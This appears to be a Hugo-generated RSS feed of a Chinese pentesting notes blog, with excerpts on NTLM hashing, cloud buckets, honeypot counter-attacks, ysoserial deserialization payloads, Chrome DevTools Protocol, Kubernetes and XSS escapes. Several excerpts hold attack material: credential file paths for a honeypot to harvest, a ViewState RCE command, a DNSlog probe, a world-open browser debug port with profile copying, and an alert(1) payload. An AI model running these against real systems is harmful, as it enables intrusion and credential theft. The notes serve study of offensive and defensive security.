@@ -1,0 +1,940 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>Nodes on h4xk0r blog</title>
+    <link>http://localhost:1313/nodes/</link>
+    <description>Recent content in Nodes on h4xk0r blog</description>
+    <generator>Hugo -- 0.155.1</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Sat, 13 Jun 2026 10:46:13 +0800</lastBuildDate>
+    <atom:link href="http://localhost:1313/nodes/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>LM,NTMLv1&amp;v2</title>
+      <link>http://localhost:1313/nodes/lmntmlv1v2/</link>
+      <pubDate>Sat, 13 Jun 2026 10:46:13 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/lmntmlv1v2/</guid>
+      <description>&lt;p&gt;&lt;code&gt;LM, NTLMv1, NTLMv2&lt;/code&gt;是windows的各个版本的&lt;strong&gt;网络认证协议&lt;/strong&gt;,用于在不传递密钥使得服务器验证用户身份&lt;/p&gt;
+&lt;h1 id=&#34;lm&#34;&gt;LM&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;LM&lt;/strong&gt;:&lt;/p&gt;
+&lt;p&gt;LM是早期windows的网络认证协议,是&lt;code&gt;Windows 3.x / 95 / 98 / Me&lt;/code&gt;时期的认证协议.在Vista版本前都默认开启&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;LM Hash生成流程&lt;/strong&gt;:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;转大写 这里以&lt;code&gt;h4xk0r&lt;/code&gt;为例&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;h4xk0r ---&amp;gt; H4XK0R
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;转换成16进制 截断/填充到14字节&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; password &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;H4XK0R&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; print(password&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hex())
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;b &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;结果不满足14字节,&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;补足
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;b &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;拆分成两个7字节&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;组1: 48 34 58 4b 30 52 00
+组2: 00 00 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;转换成DES密钥&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;将两组16进制转换成2进制
+key1: 
+1001000001101000101100001001011001100000101001000000000
+每七位一组
+组 1：0100100
+组 2：0001101
+组 3：0001011
+组 4：0000100
+组 5：1011001
+组 6：1000001
+组 7：0100100
+组 8：0000000			//不足7位补0
+
+要在每一组的最后补上 1 位，让每一组里 1 的总个数为奇数（即奇校验）
+01001001
+00011010
+00010110
+00001000
+10110011
+10000011
+01001001
+00000001
+
+合并0100100100011010000101100000100010110011100000110100100100000001  --&amp;gt; 转回16进制49 1A 16 08 B3 83 49 01
+
+key2:
+00000000000000000000000000000000000000000000000000000000
+因为是全零,分组就要补1如, 00000001
+最后转换成16进制后就是   --&amp;gt; 01 01 01 01 01 01 01 01
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;字符串(KGS!@#$%)加密&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Bucket Attack and Defense</title>
+      <link>http://localhost:1313/nodes/bucket-attack-and-defense/</link>
+      <pubDate>Mon, 18 May 2026 19:50:15 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/bucket-attack-and-defense/</guid>
+      <description>&lt;h1 id=&#34;对象存储&#34;&gt;对象存储&lt;/h1&gt;
+&lt;p&gt;存储桶是对象存储服务中的一个概念,简单来说就像一个网盘用来存储文件,图片等资源.不同的厂商名字不同但本质是一个东西&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;AWS (亚马逊云):&lt;/strong&gt; Amazon S3 (Simple Storage Service)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;阿里云:&lt;/strong&gt; OSS (Object Storage Service)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;腾讯云:&lt;/strong&gt; COS (Cloud Object Storage)&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;华为云:&lt;/strong&gt; OBS (Object Storage Service)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;存储桶的优点&#34;&gt;存储桶的优点&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;弹性容量: 根据所使用的实际大小收费&lt;/li&gt;
+&lt;li&gt;支持高并发高可用&lt;/li&gt;
+&lt;li&gt;自带网络属性: 每一个存储进存储桶的文件只要配置为&lt;strong&gt;公开&lt;/strong&gt;.就会生成一个公网的url&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;存储桶的结构&#34;&gt;存储桶的结构&lt;/h2&gt;
+&lt;div class=&#34;mermaid&#34;&gt;
+  graph TD
+    %% 样式
+    classDef b fill:#f9cb9c,stroke:#b45f06,stroke-width:2px;
+    classDef o fill:#7f8c8d,stroke:#34495e,stroke-width:1px,color:#fff;
+    classDef det fill:#fff,stroke:#333,stroke-width:1px;
+
+    %% 拓扑结构
+    Cloud[云对象存储] --&gt; Bucket1(其他存储桶...)
+    Cloud --&gt; TargetBucket(目标存储桶 bucket)
+    
+    TargetBucket --&gt; Obj1(Object 1)
+    TargetBucket --&gt; TargetObj(Object 2)
+    TargetBucket --&gt; Obj3(Object 3)
+    
+    TargetObj --&gt; Key[Key &lt;br&gt; 文件名 / 路径]
+    TargetObj --&gt; Data[Data &lt;br&gt; 文件真实内容]
+    TargetObj --&gt; Meta[Metadata &lt;br&gt; 大小 / 类型 / 权限等元数据]
+
+    class TargetObj,Obj1,Obj3 o;
+&lt;/div&gt;
+
+
+&lt;script type=&#34;module&#34;&gt;
+  import mermaid from &#39;https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs&#39;;
+  mermaid.initialize({ startOnLoad: true, theme: &#39;dark&#39; });
+&lt;/script&gt;
+&lt;p&gt;对象存储中可以有多个桶,然后把对象 (Object) 放在桶中,对象又包含&lt;code&gt;key&lt;/code&gt;,&lt;code&gt;Data&lt;/code&gt;和&lt;code&gt;Metadata&lt;/code&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>蜜罐及反制技术</title>
+      <link>http://localhost:1313/nodes/honeypot-anti-takeover/</link>
+      <pubDate>Thu, 14 May 2026 19:38:41 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/honeypot-anti-takeover/</guid>
+      <description>&lt;p&gt;蜜罐是一种主动防御技术,它通过故意暴露的漏洞或者敏感信息,诱导黑客进行攻击,增加攻击者的攻击成本并对攻击者的攻击方式进行分析,溯源等以便更好的防御的一种手段.&lt;/p&gt;
+&lt;h2 id=&#34;蜜罐的分类&#34;&gt;蜜罐的分类&lt;/h2&gt;
+&lt;p&gt;蜜罐从低到高分为低交互蜜罐,中交互蜜罐,高交互蜜罐以及蜜罐集群组成的蜜网&lt;/p&gt;
+&lt;h4 id=&#34;低交互蜜罐&#34;&gt;低交互蜜罐:&lt;/h4&gt;
+&lt;p&gt;只提供特定服务,通过脚本或者程序模拟协议的行为实现. 虽然不够仿真,但是成本低,也具备捕获攻击者IP,载荷等信息的能力&lt;/p&gt;
+&lt;h4 id=&#34;中交互蜜罐&#34;&gt;中交互蜜罐:&lt;/h4&gt;
+&lt;p&gt;中交互蜜罐可以模拟一个相对完整的应用环境,但是不具备真实的操作系统内核,是进程级的服务模拟.可以提供更完整的攻击交互,如文件上传,注入等模拟执行成功后的结果&lt;/p&gt;
+&lt;h4 id=&#34;高交互蜜罐&#34;&gt;高交互蜜罐:&lt;/h4&gt;
+&lt;p&gt;高交互蜜罐是基于真实的操作系统和服务构建的.通常在虚拟机或者沙箱中.攻击者拿到的是shell权限.但是如果防护不到位攻击者可能会以此为跳板攻击真实的内网机器.成本极高.用于捕获APT攻击等&lt;/p&gt;
+&lt;h4 id=&#34;蜜网&#34;&gt;蜜网&lt;/h4&gt;
+&lt;p&gt;蜜网实际上是有多个蜜罐组成的集群.构成:
+&lt;strong&gt;Honeywall(蜜罐网关):&lt;/strong&gt; 负责控制流量,防止攻击者逃逸和捕获数据&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;蜜罐集群:&lt;/strong&gt; 包含多种蜜罐&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Honeytoken:&lt;/strong&gt; 散布在网络中的诱饵信息,如数据库账号密码等.用于引诱攻击者下一步进攻&lt;/p&gt;
+&lt;h2 id=&#34;蜜罐反制&#34;&gt;蜜罐反制&lt;/h2&gt;
+&lt;h3 id=&#34;web蜜罐反制&#34;&gt;web蜜罐反制&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;jsonp劫持: 蜜罐前端会内置大量的主流网站(Google,GitHub等)的jsonp接口,只要当前的浏览器登陆过这些网站,蜜罐通过跨域请求就能够直接拿到你的账号信息,或者浏览器,屏幕等硬件信息.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;通过留下诱饵信息,如数据库的连接账户密码等,让攻击者进行连接,从而进行数据库蜜罐反制,或者进入蜜网等&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;通过网站的合理交互功能,如填写手机号或者个人信息,获取攻击者的信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;mysql数据库蜜罐反制&#34;&gt;MySQL数据库蜜罐反制&lt;/h3&gt;
+&lt;p&gt;&lt;strong&gt;成因:&lt;/strong&gt; &lt;code&gt;LOAD DATA LOCAL INFILE&lt;/code&gt;机制: 可以将本地文件发送到数据库中&lt;/p&gt;
+&lt;p&gt;正常使用: 客户端输入 &lt;code&gt;LOAD DATA LOCAL INFILE &#39;/etc/passwd&#39; INTO TABLE users;&lt;/code&gt;，客户端驱动就会读取本地的 &lt;code&gt;/etc/passwd&lt;/code&gt; 并发给服务器&lt;/p&gt;
+&lt;p&gt;蜜罐使用: 当你通过投下的诱饵连接数据库时,蜜罐服务器会在握手成功后或者执行命令的时候主动向客户端发送文件请求的数据包,将攻击者的文件拿到手,一些常见的抓取文件:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Windows 路径：
+C:/Users/Administrator/AppData/Roaming/Tencent/WeChat/All Users/config/config.data（获取微信基本信息）
+C:/Users/Default/AppData/Local/Google/Chrome/User Data/Default/Login Data（Chrome 凭据）
+
+Linux 路径：
+~/.ssh/id_rsa（SSH 私钥）
+~/.bash_history（历史命令，可能包含敏感密码或其它跳板 IP）
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;攻击方反制手段&#34;&gt;攻击方反制手段&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;存储型XSS:&lt;/p&gt;
+&lt;p&gt;蜜罐可以将攻击者的个人信息或者攻击载荷等展示出来如:&lt;code&gt;Username&lt;/code&gt; ,&lt;code&gt;User-Agent&lt;/code&gt;等,可以在攻击的时候在这些地方插入payload,对防守方进行反制&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;攻击者下载文件植入木马后传回去,当防守方直接打开后就会中招&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;在防守方下载文件之前,替换重要文件如微信的&lt;code&gt;config.data&lt;/code&gt;文件,替换成钓鱼凭证,当防守方查看时就会触发&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;蜜罐N-day&lt;/p&gt;
+&lt;p&gt;防守方的管理系统存在N-day或者使用的插件等存在N-day等&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;蜜罐特征转&#34;&gt;蜜罐特征(&lt;a href=&#34;https://mp.weixin.qq.com/s?biz=Mzk0NzE4MDE2NA==&amp;amp;mid=2247483908&amp;amp;idx=1&amp;amp;sn=e6a319e22c3cd54650bdbba511e58a43&#34;&gt;转&lt;/a&gt;)&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;3.1 协议的返回特征&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;部分开源蜜罐在模拟各个协议时，会在响应中带有一些明显的特征，可以根据这些特征来检测蜜罐。&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Yso</title>
+      <link>http://localhost:1313/nodes/yso/</link>
+      <pubDate>Fri, 10 Apr 2026 23:50:39 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/yso/</guid>
+      <description>&lt;h2 id=&#34;java_yso&#34;&gt;JAVA_YSO&lt;/h2&gt;
+&lt;h5 id=&#34;基础命令格式&#34;&gt;基础命令格式&lt;/h5&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;java -jar ysoserial.jar &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;利用链&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;执行的命令&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;利用链: CommonsCollections1, URLDNS, Jackson 等
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id=&#34;探测检测&#34;&gt;探测/检测&lt;/h5&gt;
+&lt;p&gt;如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用&lt;code&gt;URLDNS&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;java -jar ysoserial.jar URLDNS &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://your-dnslog-url.com&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注: 如果执行复杂命令最好封装成脚本执行,或者使用&lt;code&gt;sh -c&lt;/code&gt;/&lt;code&gt;bash -c&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;net_yso&#34;&gt;.net_yso&lt;/h2&gt;
+&lt;p&gt;基础命令&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ysoserial.exe -g &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Gadget&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -f &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;Formatter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[Command]&amp;#34;&lt;/span&gt; -o 编码
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-g  利用链的名称,如TextFormattingRunProperties
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-f  序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c  执行的命令
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-o  编码处理,如 raw ,bash64, urlencode
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用  (web Machinekey泄露)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd /c echo pwned &amp;gt; C:\windows\temp\test.txt&amp;#34;&lt;/span&gt; --validationkey&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你的KEY&amp;#34;&lt;/span&gt; --validationalg&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;SHA1&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;技巧&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;- p&lt;/code&gt; 参数可以指定插件,对一些特定目标进行测试&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;-p ViewState：处理 ASP.NET ViewState。
+-p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;利用链:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Chrome DevTools Protocol</title>
+      <link>http://localhost:1313/nodes/cdp/</link>
+      <pubDate>Mon, 30 Mar 2026 21:28:24 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/cdp/</guid>
+      <description>&lt;h3 id=&#34;什么是cdpchrome-devtools-protocol&#34;&gt;什么是CDP(Chrome DevTools Protocol)?&lt;/h3&gt;
+&lt;p&gt;cdp是一个基于JSON-RPC格式,通过websocket进行通信的协议.可以通过它对浏览器进行操作&lt;/p&gt;
+&lt;h3 id=&#34;他能做什么&#34;&gt;他能做什么?&lt;/h3&gt;
+&lt;p&gt;cdp是浏览器的底层,简单来说可以控制浏览器做任何事情&lt;/p&gt;
+&lt;h2 id=&#34;如何启动cdp&#34;&gt;如何启动CDP:&lt;/h2&gt;
+&lt;p&gt;以下以chrome浏览器做演示,但是实际上只要使用了Chromium内核的浏览器都原生支持CDP如 &lt;code&gt;chrome,edge&lt;/code&gt;Gecko(firefox) 部分支持,而WebKit(Safari)对CDP却不支持&lt;/p&gt;
+&lt;p&gt;注:  因浏览器默认都是&lt;strong&gt;单实例模式&lt;/strong&gt;,&lt;strong&gt;指令会传递给已有进程但并不执行&lt;/strong&gt;.所以开启远程端口前需要先关闭原有进程,命令:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;taskkill /F /IM chrome.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;开启远程调试端口&#34;&gt;开启远程调试端口&lt;/h3&gt;
+&lt;p&gt;关闭chrome后我们执行&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;chrome.exe --remote-debugging-port=9226 --remote-debugging-address=0.0.0.0 --remote-allow-origins=* --user-data-dir=&amp;#34;C:\Users\Public\ChromeDebug&amp;#34; --headless=new
+
+参数讲解:
+--remote-debugging-port			 指定开启的远程调试端口
+--remote-debugging-address		 允许指定IP访问调试,新版禁用了0.0.0.0,可以使用端口转发.(最后提供一个frpc解决方式,见文章末尾)
+--remote-allow-origins			 允许任何来源连接调试端口
+--headless=new					无头模式(109引入)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;--user-data-dir&lt;/code&gt;: 默认目录为&lt;code&gt;%LOCALAPPDATA%\Google\Chrome\User Data&lt;/code&gt; 当指定一个目录的时候浏览器会打开一个新的浏览器页面相当与两个用户数据互不干扰.&lt;/p&gt;
+&lt;p&gt;这里在测试时发现本地复制&lt;code&gt;user Data&lt;/code&gt;目录启动浏览器依然不可以获取凭证,按理来说不同机器复制才会出现这种情况,希望有大佬解惑.复制命令如下&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;powershell:
+powershell -command &amp;#34;$exclude = @(&amp;#39;Cache&amp;#39;,&amp;#39;Code Cache&amp;#39;,&amp;#39;GPUCache&amp;#39;,&amp;#39;Media Cache&amp;#39;,&amp;#39;Service Worker&amp;#39;); Get-ChildItem -Path $env:LOCALAPPDATA&amp;#39;\Google\Chrome\User Data&amp;#39; -Recurse | Where-Object { $exclude -notcontains $_.Name } | Copy-Item -Destination { Join-Path $env:LOCALAPPDATA&amp;#39;\ChromeDebug&amp;#39; $_.FullName.Substring($env:LOCALAPPDATA.Length + 25) } -Force -ErrorAction SilentlyContinue&amp;#34;
+
+cmd:
+xcopy &amp;#34;%LOCALAPPDATA%\Google\Chrome\User Data&amp;#34; &amp;#34;%LOCALAPPDATA%\ChromeDebug&amp;#34; /E /I /H /C /Y /EXCLUDE:no_copy.txt
+/EXCLUDE:no_copy.txt  指定排除文件
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;开启远程端口后检查是否成功&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>K8s&amp;Docker</title>
+      <link>http://localhost:1313/nodes/k8s/</link>
+      <pubDate>Mon, 30 Mar 2026 21:28:24 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/k8s/</guid>
+      <description>&lt;h2 id=&#34;docker&#34;&gt;Docker&lt;/h2&gt;
+&lt;p&gt;docker是一种轻量级容器技术,可将应用及其依赖打包成标准化单元&lt;/p&gt;
+&lt;h2 id=&#34;docker的优势&#34;&gt;Docker的优势&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;启动快速&lt;/li&gt;
+&lt;li&gt;跨平台&lt;/li&gt;
+&lt;li&gt;高效运维&lt;/li&gt;
+&lt;li&gt;环境一致性 (避免只有我的机器能跑)&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;k8s的作用和架构&#34;&gt;K8s的作用和架构&lt;/h2&gt;
+&lt;h3 id=&#34;为什么需要k8s&#34;&gt;为什么需要k8s?&lt;/h3&gt;
+&lt;p&gt;假设现在又10个容器让你管理,管理的过来,那随着业务发展增加到1000台呢,这些容器又部署在不同的服务器上,每一个环境都不相同.那有什么办法解决这个问题?  于是k8s应运而生&lt;/p&gt;
+&lt;h3 id=&#34;k8s的优势&#34;&gt;k8s的优势&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;资源自动调度&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;k8s会根据容器所需的资源扫描服务器集群,把空闲的机器部署容器,实现资源最大化
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;负载均衡&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;k8s提供一个统一的入口,不管后端容器的IP变化,都会转发到对应的容器中
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;自动修复&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;k8s会不断检查运行状态,如果容器挂了会自动拉起一个新的,如果机器坏了,会自动迁移到其他机器上
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;k8s核心组件&#34;&gt;K8s核心组件&lt;/h3&gt;
+&lt;div class=&#34;mermaid&#34;&gt;
+  graph TD
+    %% 定义 Master 节点结构
+    subgraph MasterGroup[Master节点]
+        direction TB
+        Master[Master节点] --&gt; API[API Server]
+        Master --&gt; CM[Controller Manager]
+        Master --&gt; Sched[Scheduler]
+    end
+
+    %% 定义 Node 节点结构
+    subgraph NodeGroup[Node节点]
+        direction TB
+        Node[Node节点] --&gt; KL[Kubelet]
+        Node --&gt; KP[Kube-Proxy]
+        Node --&gt; P[Pod]
+    end
+&lt;/div&gt;
+
+
+&lt;script type=&#34;module&#34;&gt;
+  import mermaid from &#39;https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs&#39;;
+  mermaid.initialize({ startOnLoad: true, theme: &#39;dark&#39; });
+&lt;/script&gt;
+&lt;p&gt;&lt;strong&gt;Pod&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>XSS</title>
+      <link>http://localhost:1313/nodes/xss/</link>
+      <pubDate>Thu, 19 Mar 2026 00:33:54 +0800</pubDate>
+      <guid>http://localhost:1313/nodes/xss/</guid>
+      <description>&lt;h2 id=&#34;逃逸手法分类选择&#34;&gt;逃逸手法分类/选择:&lt;/h2&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;**HTML标签内部:**如在&lt;code&gt;&amp;lt;div&amp;gt; xxx &amp;lt;/div&amp;gt;&lt;/code&gt;中&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;逃逸:&lt;/strong&gt; 直接闭合标签&lt;code&gt;&amp;lt;/div&amp;gt;  &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;HTML属性内部:&lt;/strong&gt;&lt;code&gt;&amp;lt;input type=&amp;quot;text&amp;quot; value=&amp;quot;xxxx&amp;quot;&amp;gt;&lt;/code&gt;&lt;/p&gt;
